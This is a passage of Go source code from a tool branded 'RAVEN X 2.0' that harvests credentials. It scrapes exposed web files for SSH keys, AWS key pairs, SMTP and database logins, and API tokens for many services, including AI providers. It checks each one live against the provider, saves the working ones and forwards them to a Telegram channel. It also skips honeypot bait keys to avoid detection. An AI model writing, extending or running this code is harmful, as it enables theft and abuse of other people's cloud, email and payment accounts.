			if status, _ := result["status"].(string); status == "active" {
				a.logValid("Cloudflare", fmt.Sprintf("Token: %s | Status: active", key))
				a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_cloudflare.txt")
				a.storeValidKeyLimit("Cloudflare", key, "active")
				globalCounters.mu.Lock()
				globalCounters.APIsValidated++
				globalCounters.mu.Unlock()
				msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n☁️ <b>CLOUDFLARE TOKEN LIVE</b>\n\n🔑 <b>Token:</b> <code>%s</code>\n📊 <b>Status:</b> active\n🔗 <b>Source:</b> %s", key, sourceURL)
				go a.sendTelegram(msg)
				return true
			}
		}
	}
	return false
}

// CheckDigitalOcean validates a DigitalOcean PAT (dop_v1_) via /v2/account.
func (a *AWSScanner) CheckDigitalOcean(key, sourceURL string) bool {
	if !a.Config.APIValidation.DigitalOcean {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}
	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()
	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "digitalocean_found.txt")
	req, err := http.NewRequest("GET", "https://api.digitalocean.com/v2/account", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Bearer "+key)
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	resp, err := do429Retry(client, req.WithContext(ctx), 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		var res map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&res)
		acct, _ := res["account"].(map[string]interface{})
		email, _ := acct["email"].(string)
		doStatus, _ := acct["status"].(string)
		a.logValid("DigitalOcean", fmt.Sprintf("Token: %s | Email: %s", key, email))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_digitalocean.txt")
		a.storeValidKeyLimit("DigitalOcean", key, fmt.Sprintf("Email: %s Status: %s", email, doStatus))
		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()
		msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🌊 <b>DIGITALOCEAN TOKEN LIVE</b>\n\n🔑 <b>Token:</b> <code>%s</code>\n📧 <b>Email:</b> %s\n📊 <b>Status:</b> %s\n🔗 <b>Source:</b> %s", key, email, doStatus, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}

// CheckShopify saves a Shopify access token match. Validation requires a store
// URL which is not available at scan time, so the token is recorded for manual
// follow-up. Returns false (no live validation performed).
func (a *AWSScanner) CheckShopify(key, sourceURL string) bool {
	if !a.Config.APIValidation.Shopify {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}
	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()
	a.logFound("Shopify", key, sourceURL)
	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "shopify_found.txt")
	msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🛒 <b>SHOPIFY TOKEN FOUND</b>\n\n🔑 <b>Token:</b> <code>%s</code>\n🔗 <b>Source:</b> %s", key, sourceURL)
	go a.sendTelegram(msg)
	return false
}

// CheckHubSpot validates a HubSpot private app token (pat-) via CRM contacts.
func (a *AWSScanner) CheckHubSpot(key, sourceURL string) bool {
	if !a.Config.APIValidation.HubSpot {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}
	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()
	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "hubspot_found.txt")
	req, err := http.NewRequest("GET", "https://api.hubapi.com/crm/v3/objects/contacts?limit=1", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Bearer "+key)
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	resp, err := do429Retry(client, req.WithContext(ctx), 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		a.logValid("HubSpot", fmt.Sprintf("Token: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_hubspot.txt")
		a.storeValidKeyLimit("HubSpot", key, "Active")
		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()
		msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🟠 <b>HUBSPOT TOKEN LIVE</b>\n\n🔑 <b>Token:</b> <code>%s</code>\n🔗 <b>Source:</b> %s", key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}

// CheckHeroku validates a Heroku API key (UUID format) via GET /account.
func (a *AWSScanner) CheckHeroku(key, sourceURL string) bool {
	if !a.Config.APIValidation.Heroku {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}
	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()
	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "heroku_found.txt")
	req, err := http.NewRequest("GET", "https://api.heroku.com/account", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Accept", "application/vnd.heroku+json; version=3")
	req.Header.Set("Authorization", "Bearer "+key)
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	resp, err := do429Retry(client, req.WithContext(ctx), 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		var res map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&res)
		email, _ := res["email"].(string)
		a.logValid("Heroku", fmt.Sprintf("Key: %s | Email: %s", key, email))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_heroku.txt")
		a.storeValidKeyLimit("Heroku", key, fmt.Sprintf("Email: %s", email))
		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()
		msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🟣 <b>HEROKU API KEY LIVE</b>\n\n🔑 <b>Key:</b> <code>%s</code>\n📧 <b>Email:</b> %s\n🔗 <b>Source:</b> %s", key, email, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}

// CheckDatadog validates a Datadog API key (32-char hex) via the validate endpoint.
func (a *AWSScanner) CheckDatadog(key, sourceURL string) bool {
	if !a.Config.APIValidation.Datadog {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}
	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()
	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "datadog_found.txt")
	req, err := http.NewRequest("GET", "https://api.datadoghq.com/api/v1/validate", nil)
	if err != nil {
		return false
	}
	req.Header.Set("DD-API-KEY", key)
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	resp, err := do429Retry(client, req.WithContext(ctx), 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		var res map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&res)
		if valid, _ := res["valid"].(bool); valid {
			a.logValid("Datadog", fmt.Sprintf("Key: %s", key))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_datadog.txt")
			a.storeValidKeyLimit("Datadog", key, "Active")
			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()
			msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🐶 <b>DATADOG API KEY LIVE</b>\n\n🔑 <b>Key:</b> <code>%s</code>\n🔗 <b>Source:</b> %s", key, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

func (a *AWSScanner) extractAndTestSMTP(text, sourceURL string) {
	if !a.Config.ScanningFeatures.SMTPCredentialsScan { // Pengecekan fitur baru
		return
	}
	host := ""
	port := ""
	user := ""
	pass := ""
	from := ""

	isPhpInfo := strings.Contains(text, "phpinfo()") || strings.Contains(text, "Configuration File (php.ini) Path")

	if isPhpInfo {
		host = strings.TrimSpace(extractValueFromPhpInfoTable(text, "MAIL_HOST"))
		if host == "" {
			host = strings.TrimSpace(extractValueFromPhpInfoTable(text, "SMTP_HOST"))
		}
		port = strings.TrimSpace(extractValueFromPhpInfoTable(text, "MAIL_PORT"))
		if port == "" {
			port = strings.TrimSpace(extractValueFromPhpInfoTable(text, "SMTP_PORT"))
		}
		user = strings.TrimSpace(extractValueFromPhpInfoTable(text, "MAIL_USERNAME"))
		if user == "" {
			user = strings.TrimSpace(extractValueFromPhpInfoTable(text, "SMTP_USER"))
		}
		pass = strings.TrimSpace(extractValueFromPhpInfoTable(text, "MAIL_PASSWORD"))
		if pass == "" {
			pass = strings.TrimSpace(extractValueFromPhpInfoTable(text, "SMTP_PASSWORD"))
		}
		from = strings.TrimSpace(extractValueFromPhpInfoTable(text, "MAIL_FROM_ADDRESS"))
		if from == "" {
			from = strings.TrimSpace(extractValueFromPhpInfoTable(text, "MAIL_FROM"))
		}

	} else {
		if m := a.SMTPHostPattern.FindStringSubmatch(text); len(m) > 1 {
			host = strings.TrimSpace(m[1])
		}
		if m := a.SMTPPortPattern.FindStringSubmatch(text); len(m) > 1 {
			port = strings.TrimSpace(m[1])
		}
		if m := a.SMTPUserPattern.FindStringSubmatch(text); len(m) > 1 {
			user = strings.TrimSpace(m[1])
		}
		if m := a.SMTPPassPattern.FindStringSubmatch(text); len(m) > 1 {
			pass = strings.TrimSpace(m[1])
		}
		if m := a.SMTPFromPattern.FindStringSubmatch(text); len(m) > 1 {
			from = strings.TrimSpace(m[1])
		}
	}

	// host + user + pass required; port and from are synthesised if absent
	if host == "" || user == "" || pass == "" {
		return
	}
	if port == "" {
		port = "587"
	}
	if from == "" {
		if strings.Contains(user, "@") {
			from = user
		} else {
			from = user + "@" + host
		}
	}

	// Validasi tambahan: pastikan format valid
	// Host harus mengandung domain atau IP
	if !strings.Contains(host, ".") && !strings.Contains(host, ":") {
		return
	}
	// Port harus angka valid (1-65535)
	if portNum, err := strconv.Atoi(port); err != nil || portNum <= 0 || portNum > 65535 {
		return
	}
	// From harus mengandung @ (email format)
	if !strings.Contains(from, "@") {
		return
	}
	// User dan pass tidak boleh kosong setelah trim
	if strings.TrimSpace(user) == "" || strings.TrimSpace(pass) == "" {
		return
	}

	// Pattern match found — save before attempting validation
	smtpLine := fmt.Sprintf("%s:%s:%s:%s:%s", host, port, user, pass, from)
	a.logFound("SMTP", smtpLine, sourceURL)
	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), smtpLine), "smtp_found.txt")

	// Validate via AUTH handshake (no test email required)
	go a.validateSMTPCredentials(host, port, user, pass, from, sourceURL)
}

func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
	// Panic recovery untuk mencegah crash
	defer func() {
		if r := recover(); r != nil {
			pterm.Debug.Printfln("[PANIC RECOVERED] in checkAndSaveKeys for %s: %v", sourceURL, r)
		}
	}()

	honeypotBaitPattern := regexp.MustCompile(`(?i)(SK_TEST_9999999999999999|AKIA` + `IOSFODNN7EXAMPLE|KEY_FAKE_DO_NOT_USE)`)
	if honeypotBaitPattern.MatchString(text) {
		pterm.Error.Printfln("[HONEYPOT DETECTED] Skipping domain due to bait pattern in %s", sourceURL)
		return
	}

	// Cegah rekursi dari AST extraction
	if strings.Contains(sourceURL, "(from AST:") {
		return
	}

	// .DS_Store binary — extract directory listing, skip credential regex
	if strings.Contains(sourceURL, "DS_Store") {
		a.extractDSStoreFilenames(text, sourceURL)
		return
	}

	sanitizedText := text

	base64Candidates := base64CandidatePattern.FindAllString(text, -1)

	// Batasi jumlah base64 candidates untuk mencegah OOM
	maxCandidates := 100
	if len(base64Candidates) > maxCandidates {
		base64Candidates = base64Candidates[:maxCandidates]
	}

	for _, candidate := range base64Candidates {
		decoded := tryDecodeBase64(candidate)
		if decoded != "" && len(decoded) < 100000 { // Batasi ukuran decoded
			sanitizedText += "\n" + decoded
		}
	}

	// Batasi total ukuran content untuk mencegah OOM
	if len(sanitizedText) > 2*1024*1024 { // 2MB max
		sanitizedText = sanitizedText[:2*1024*1024]
	}

	contentToScan := sanitizedText

	// SSH private key detection — PEM blocks in fetched files
	if a.Config.ScanningFeatures.SSHScan {
		sshKeyMatches := a.SSHPrivateKeyPattern.FindAllString(contentToScan, -1)
		var wgSSH sync.WaitGroup
		validationSemSSH := make(chan struct{}, 50)
		for _, keyBlock := range unique(sshKeyMatches) {
			l := len(keyBlock)
			if l > 60 {
				l = 60
			}
			dedupKey := "sshkey:" + keyBlock[:l]
			if _, loaded := a.KnownKeys.LoadOrStore(dedupKey, true); !loaded {
				a.logFound("SSH Private Key", "[PEM BLOCK DETECTED]", sourceURL)
				a.saveIntoFile(fmt.Sprintf("SOURCE: %s\n%s\n---END---", sanitizeSource(sourceURL), keyBlock), "ssh_keys_found.txt")
				globalCounters.mu.Lock()
				globalCounters.APIsFoundTotal++
				globalCounters.mu.Unlock()
				if a.Config.APIValidation.SSH {
					wgSSH.Add(1)
					validationSemSSH <- struct{}{}
					go func(k, u string) {
						defer wgSSH.Done()
						defer func() { <-validationSemSSH }()
						a.CheckSSHPrivateKey(k, u)
					}(keyBlock, sourceURL)
				}
			}
		}
		wgSSH.Wait()
	}

	// SSH/SFTP credential extraction from env files
	if a.Config.ScanningFeatures.SSHScan {
		a.extractSSHCredsFromText(contentToScan, sourceURL)
	}

	// Database credential extraction
	if a.Config.APIValidation.MySQL || a.Config.APIValidation.PostgreSQL || a.Config.APIValidation.Redis {
		a.extractDBCredsFromText(contentToScan, sourceURL)
	}

	// Web panel credential extraction (cPanel, FTP, WordPress)
	if a.Config.APIValidation.CPanel || a.Config.APIValidation.FTP || a.Config.APIValidation.WordPress {
		a.extractWebPanelCredsFromText(contentToScan, sourceURL)
	}

	apiChecks := []struct {
		Pattern *regexp.Regexp
		Feature bool
		Name    string
		CheckFn func(key, sourceURL string) bool
	}{
		{a.SendGridAPIKeyPattern, a.Config.APIValidation.SendGrid, "SendGrid", a.CheckSendGrid},
		{a.StripePattern, a.Config.APIValidation.Stripe, "Stripe", a.CheckStripe},
		{a.MailgunAPIKeyPattern, a.Config.APIValidation.Mailgun, "Mailgun", a.CheckMailgun},
		{a.TelnyxApiPatternInfo, a.Config.APIValidation.Telnyx, "Telnyx", a.CheckTelnyx},
		{a.OpenAIAPIPattern, a.Config.APIValidation.OpenAI || a.Config.APIValidation.AIAll, "OpenAI", a.CheckOpenAI},
		{a.AnthropicPattern, a.Config.APIValidation.Anthropic || a.Config.APIValidation.AIAll, "Anthropic", a.CheckAnthropic},
		{a.MessageBirdPattern, a.Config.APIValidation.MessageBird, "MessageBird", a.CheckMessageBird},
		{a.BrevoAPIKeyPattern, a.Config.APIValidation.Brevo, "Brevo", a.CheckBrevo},
		{a.XSMTPAPIKeyPattern, a.Config.APIValidation.XSMTP, "XSMTP", a.CheckXSMTP},
		{a.MandrillAppAPIKeyPattern, a.Config.APIValidation.Mandrill, "Mandrill", a.CheckMandrill},
		{a.MailerSendAPIKeyPattern, a.Config.APIValidation.MailerSend, "MailerSend", a.CheckMailerSend},
		{a.NewMailgunAPIKeyPattern, a.Config.Features.NewMailgun, "NewMailgun", a.CheckMailgun},
		{postmarkPattern, a.Config.APIValidation.Postmark, "Postmark", a.CheckPostmark},
		{sparkpostPattern, a.Config.APIValidation.SparkPost, "SparkPost", a.CheckSparkPost},
		{mailtrapPattern, a.Config.APIValidation.Mailtrap, "Mailtrap", a.CheckMailtrap},
		{mailjetPattern, a.Config.APIValidation.Mailjet, "Mailjet", a.CheckMailjet},
		{plivoPattern, a.Config.APIValidation.Plivo, "Plivo", a.CheckPlivo},
		{a.GitHubTokenPattern, a.Config.APIValidation.GitHub, "GitHub", a.CheckGitHubToken},
		{a.GCPAPIKeyPattern, a.Config.APIValidation.GCP, "GCP", a.CheckGCPKey},
		{a.CryptoWalletPattern, a.Config.APIValidation.Crypto, "Crypto", a.CheckCryptoWallet},
		// Wave-7 additions
		{a.SlackBotTokenPattern, a.Config.APIValidation.Slack, "Slack", a.CheckSlack},
		{a.DiscordBotTokenPattern, a.Config.APIValidation.Discord, "Discord", a.CheckDiscord},
		{a.CloudflareTokenPattern, a.Config.APIValidation.Cloudflare, "Cloudflare", a.CheckCloudflare},
		{a.DigitalOceanTokenPattern, a.Config.APIValidation.DigitalOcean, "DigitalOcean", a.CheckDigitalOcean},
		{a.ShopifyTokenPattern, a.Config.APIValidation.Shopify, "Shopify", a.CheckShopify},
		{a.HubSpotTokenPattern, a.Config.APIValidation.HubSpot, "HubSpot", a.CheckHubSpot},
		{a.HerokuAPIKeyPattern, a.Config.APIValidation.Heroku, "Heroku", a.CheckHeroku},
		{a.DatadogAPIKeyPattern, a.Config.APIValidation.Datadog, "Datadog", a.CheckDatadog},
		// Wave-9: Extended AI providers
		{a.GeminiAPIKeyPattern, a.Config.APIValidation.Gemini || a.Config.APIValidation.AIAll, "Gemini", a.CheckGemini},
		{a.XAIAPIKeyPattern, a.Config.APIValidation.XAI || a.Config.APIValidation.AIAll, "xAI", a.CheckXAI},
		{a.MistralAPIKeyPattern, a.Config.APIValidation.Mistral || a.Config.APIValidation.AIAll, "Mistral", a.CheckMistral},
		{a.ElevenLabsAPIKeyPattern, a.Config.APIValidation.ElevenLabs || a.Config.APIValidation.AIAll, "ElevenLabs", a.CheckElevenLabs},
		{a.GroqAPIKeyPattern, a.Config.APIValidation.Groq || a.Config.APIValidation.AIAll, "Groq", a.CheckGroq},
		{a.PerplexityAPIKeyPattern, a.Config.APIValidation.Perplexity || a.Config.APIValidation.AIAll, "Perplexity", a.CheckPerplexity},
		{a.OpenRouterAPIKeyPattern, a.Config.APIValidation.OpenRouter || a.Config.APIValidation.AIAll, "OpenRouter", a.CheckOpenRouter},
		{a.HuggingFaceAPIKeyPattern, a.Config.APIValidation.HuggingFace || a.Config.APIValidation.AIAll, "HuggingFace", a.CheckHuggingFace},
		{a.ReplicateAPIKeyPattern, a.Config.APIValidation.Replicate || a.Config.APIValidation.AIAll, "Replicate", a.CheckReplicate},
		{a.CohereAPIKeyPattern, a.Config.APIValidation.Cohere || a.Config.APIValidation.AIAll, "Cohere", a.CheckCohere},
		{a.TogetherAIAPIKeyPattern, a.Config.APIValidation.TogetherAI || a.Config.APIValidation.AIAll, "TogetherAI", a.CheckTogetherAI},
		{a.FireworksAPIKeyPattern, a.Config.APIValidation.Fireworks || a.Config.APIValidation.AIAll, "Fireworks", a.CheckFireworks},
		// Wave-9: Extended email providers
		{a.MailchimpAPIKeyPattern, a.Config.APIValidation.Mailchimp, "Mailchimp", a.CheckMailchimp},
		{mailchimpContextAPIKeyPattern, a.Config.APIValidation.Mailchimp, "Mailchimp", a.CheckMailchimp},
		{a.ResendAPIKeyPattern, a.Config.APIValidation.Resend, "Resend", a.CheckResend},
		// Wave-10: Git hosting platforms
		{a.GitLabTokenPattern, a.Config.APIValidation.GitLab, "GitLab", a.CheckGitLab},
		{a.BitbucketAppPasswordPattern, a.Config.APIValidation.Bitbucket, "Bitbucket", a.CheckBitbucket},
		{a.BitbucketContextPattern, a.Config.APIValidation.Bitbucket, "Bitbucket", a.CheckBitbucket},
	}

	var wg sync.WaitGroup
	// Batasi concurrent API validations untuk semua checks
	validationSem := make(chan struct{}, 50)

	// Tencent — pattern-matched AKID keys; CheckTencent validates only when flag is on.
	if a.Config.APIValidation.Tencent {
		tencentKeys := unique(a.TencentAccessKeyPattern.FindAllString(contentToScan, -1))
		for _, key := range tencentKeys {
			if _, loaded := a.KnownKeys.LoadOrStore(key, true); !loaded {
				a.logFound("Tencent", key, sourceURL)
				wg.Add(1)
				validationSem <- struct{}{}
				go func(k, u string) {
					defer wg.Done()
					defer func() { <-validationSem }()
					a.CheckTencent(k, u)
				}(key, sourceURL)
			}
		}
	}

	// Aliyun scanning disabled

	for _, check := range apiChecks {
		if check.Feature {
			// Use FindAllStringSubmatch so patterns with a capture group return
			// only the captured value (group 1), not the full context-prefixed
			// match. Patterns without a capture group fall back to m[0].
			var rawKeys []string
			for _, m := range check.Pattern.FindAllStringSubmatch(contentToScan, -1) {
				if len(m) > 1 && m[1] != "" {
					rawKeys = append(rawKeys, m[1])
				} else if len(m) > 0 {
					rawKeys = append(rawKeys, m[0])
				}
			}
			// Derive a stable found-file name, e.g. "SendGrid" → "sendgrid_found.txt"
			foundFile := strings.ToLower(strings.ReplaceAll(check.Name, " ", "_")) + "_found.txt"
			for _, key := range unique(rawKeys) {
				a.logFound(check.Name, key, sourceURL)
				// Record the raw match before validation so credentials are never
				// silently lost to timeouts or revoked-key failures.
				a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), foundFile)
				globalCounters.mu.Lock()
				globalCounters.APIsFoundTotal++
				globalCounters.mu.Unlock()
				wg.Add(1)
				validationSem <- struct{}{}
				go func(k, url string, fn func(string, string) bool) {
					defer wg.Done()
					defer func() { <-validationSem }()
					fn(k, url)
				}(key, sourceURL, check.CheckFn)
			}
		}
	}

	// nonValidatedChecks — pattern-only (no live API validator yet).
	// Postmark and Mailjet are fully validated in apiChecks above; they are
	// intentionally excluded here to avoid double-counting found files.
	nonValidatedChecks := []struct {
		Pattern *regexp.Regexp
		Name    string
	}{
		{a.NPMAuthTokenPattern, "NPM Auth Token"},
	}

	for _, check := range nonValidatedChecks {
		keys := unique(check.Pattern.FindAllString(contentToScan, -1))
		for _, key := range keys {
			if _, loaded := a.KnownKeys.LoadOrStore(key, true); !loaded {
				a.logFound(check.Name, key, sourceURL)
				a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), strings.ReplaceAll(check.Name, " ", "_")+"_found.txt")

				globalCounters.mu.Lock()
				globalCounters.APIsFoundTotal++
				globalCounters.mu.Unlock()
			}
		}
	}

	if a.Config.ScanningFeatures.AWSMainScan { // Menggunakan flag baru untuk AWS
		// Gabungkan semua potensi Access Key: AKIA (Standar) dan ASIA (SES/Federated/Temporary)
		sesKeys := unique(a.AWSSESUserPattern.FindAllString(contentToScan, -1))
		sks := unique(a.AWSSecretKeyPatternInfo.FindAllString(contentToScan, -1))
		var rawTokens []string
		for _, m := range a.AWSSessionTokenPattern.FindAllStringSubmatch(contentToScan, -1) {
			if len(m) > 1 && m[1] != "" {
				rawTokens = append(rawTokens, m[1])
			}
		}
		sessionTokens := unique(rawTokens)

		// 1. Validate all AK+SK pairs (both AKIA long-lived and ASIA temporary).
		// ASIA keys without a session token will fail STS and land in
		// aws_ses_potential_unverified.txt — still recorded, not silently dropped.
		// Loop 2 below also tries ASIA+SK+ST triplets when a session token is present.
		for _, ak := range sesKeys {
			for _, sk := range sks {
				if len(sk) == 40 {
					keyPair := fmt.Sprintf("%s:%s", ak, sk)

					if _, loaded := a.KnownKeys.LoadOrStore(keyPair, true); loaded {
						continue
					}

					name := "AWS (AKIA Standard)"
					if strings.HasPrefix(ak, "ASIA") {
						name = "AWS (ASIA Temporary/SES-Federated)"
					}

					a.logFound(name, keyPair, sourceURL)
					globalCounters.mu.Lock()
					globalCounters.APIsFoundTotal++
					globalCounters.mu.Unlock()

					// Lakukan validasi penuh (STS:GetCallerIdentity) di goroutine
					wg.Add(1)
					validationSem <- struct{}{}
					go func(ak, sk, u, keyName string) {
						defer wg.Done()
						defer func() { <-validationSem }()
						pterm.Info.Printfln("[CHECK] Validating %s Key: %s...", keyName, ak[:8]+"...")

						valid, identity, cfg, s3Status := a.validateAWSCredentials(ak, sk, "")

						if valid {
							// Jika valid, handle sebagai kunci AWS yang sah
							a.handleValidAWS(ak, sk, "", u, identity, cfg, s3Status)
							globalCounters.mu.Lock()
							globalCounters.APIsValidated++
							globalCounters.mu.Unlock()
						} else {
							// Jika gagal validasi, simpan sebagai potential key yang belum terverifikasi
							a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sanitizeSource(u), ak, sk), "aws_ses_potential_unverified.txt")
							pterm.Debug.Printfln("[AWS FAIL] Key %s failed full STS validation.", ak[:8]+"...")
						}
					}(ak, sk, sourceURL, name)
				}
			}
		}

		// 2. Validasi pasangan AK, SK, dan Session Token (AKIA/ASIA + SK + ST)
		for _, ak := range sesKeys {
			for _, sk := range sks {
				for _, st := range sessionTokens {
					keyTriplet := fmt.Sprintf("%s:%s:%s", ak, sk, st)

					if _, loaded := a.KnownKeys.LoadOrStore(keyTriplet, true); loaded {
						continue
					}

					name := "AWS (Session Token)"
					a.logFound(name, keyTriplet, sourceURL)
					globalCounters.mu.Lock()
					globalCounters.APIsFoundTotal++
					globalCounters.mu.Unlock()

					wg.Add(1)
					validationSem <- struct{}{}
					go func(ak, sk, st, u, keyName string) {
						defer wg.Done()
						defer func() { <-validationSem }()
						pterm.Info.Printfln("[CHECK] Validating %s Key: %s...", keyName, ak[:8]+"...")

						valid, identity, cfg, s3Status := a.validateAWSCredentials(ak, sk, st)
						if valid {
							a.handleValidAWS(ak, sk, st, u, identity, cfg, s3Status)
							globalCounters.mu.Lock()
							globalCounters.APIsValidated++
							globalCounters.mu.Unlock()
						} else {
							pterm.Debug.Printfln("[AWS FAIL] Session Key %s failed full STS validation.", ak[:8]+"...")
						}
					}(ak, sk, st, sourceURL, name)
				}
			}
		}
	}

	// Pengecekan Twilio menggunakan APIValidation
	if a.Config.APIValidation.Twilio {
		sids := unique(a.TwilioSIDPatternInfo.FindAllString(contentToScan, -1))
		// Extract group 1 to strip surrounding quotes from auth tokens.
		var rawAuths []string
		for _, m := range a.TwilioAuthPatternInfo.FindAllStringSubmatch(contentToScan, -1) {
			if len(m) > 1 && m[1] != "" && !strings.HasPrefix(m[1], "AC") {
				rawAuths = append(rawAuths, m[1])
			}
		}
		auths := unique(rawAuths)
		encoded := unique(a.TwilioEncodePatternInfo.FindAllString(contentToScan, -1))
		for _, enc := range encoded {
			if dec, err := base64.StdEncoding.DecodeString(enc); err == nil {
				parts := strings.Split(string(dec), ":")
				if len(parts) == 2 {
					sids = append(sids, parts[0])
					auths = append(auths, parts[1])
				}
			}
		}

		for _, sid := range sids {
			for _, auth := range auths {
				a.logFound("Twilio", fmt.Sprintf("%s:%s", sid, auth), sourceURL)
				a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sanitizeSource(sourceURL), sid, auth), "twilio_found.txt")
				wg.Add(1)
				validationSem <- struct{}{}
				go func(s, aT, u string) {
					defer wg.Done()
					defer func() { <-validationSem }()
					a.CheckTwilio(s, aT, u)
				}(sid, auth, sourceURL)
			}
		}
	}

	// Pengecekan Nexmo menggunakan APIValidation
	if a.Config.APIValidation.Nexmo {
		keys := make([]string, 0)
		secrets := make([]string, 0)

		km := a.NexmoApiPatternInfo.FindAllStringSubmatch(contentToScan, -1)
		for _, m := range km {
			if len(m) > 2 {
				keys = append(keys, m[2])
			}
		}

		sm := a.NexmoSecretPatternInfo.FindAllStringSubmatch(contentToScan, -1)
		for _, m := range sm {
			if len(m) > 2 {
				secrets = append(secrets, m[2])
			}
		}

		for _, k := range unique(keys) {
			for _, s := range unique(secrets) {
				a.logFound("Nexmo", fmt.Sprintf("%s:%s", k, s), sourceURL)
				a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sanitizeSource(sourceURL), k, s), "nexmo_found.txt")
				wg.Add(1)
				validationSem <- struct{}{}
				go func(k, s, u string) {
					defer wg.Done()
					defer func() { <-validationSem }()
					a.CheckNexmo(k, s, u)
				}(k, s, sourceURL)
			}
		}
	}

	// Pengecekan SMTP menggunakan ScanningFeatures
	a.extractAndTestSMTP(contentToScan, sourceURL)

	// ── Gap-closer passes ────────────────────────────────────────────────────
	// Shannon entropy: catches non-regex token formats (internal API keys,
	// HMAC secrets, custom auth tokens) by flagging high-entropy assignments.
	a.scanEntropyPass(contentToScan, sourceURL)
	// Webhook URLs: Slack/Discord/PagerDuty embed live auth tokens in URLs.
	a.scanWebhookURLs(contentToScan, sourceURL)
	// Firebase: extract projectId and test open Firestore / Realtime DB rules.
	a.checkFirebaseOpenRules(contentToScan, sourceURL)
	// Terraform state: walk resources[*].instances[*].attributes JSON tree.
	a.parseTerraformStateContent(contentToScan, sourceURL)

	// Ekstraksi menggunakan AST - hanya mengambil pola yang sesuai dengan regex yang sudah didefinisikan
	a.extractValidatorsFromCode(contentToScan, sourceURL)

	wg.Wait()
}

// Exploit functions untuk ekstraksi credentials
// React2Shell - exploit React applications untuk ekstraksi credentials
func sanitizeSource(url string) string {
	s := strings.TrimPrefix(url, "https://")
	return strings.TrimPrefix(s, "http://")
}

func (a *AWSScanner) probeGraphQLIntrospection(baseURL string) {
	payload := `{"query":"{__schema{types{name description}}}"}`
	req, err := http.NewRequest("POST", baseURL, strings.NewReader(payload))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", nextUA())
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	resp, err := client.Do(req.WithContext(ctx))
	if err != nil || resp == nil {
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
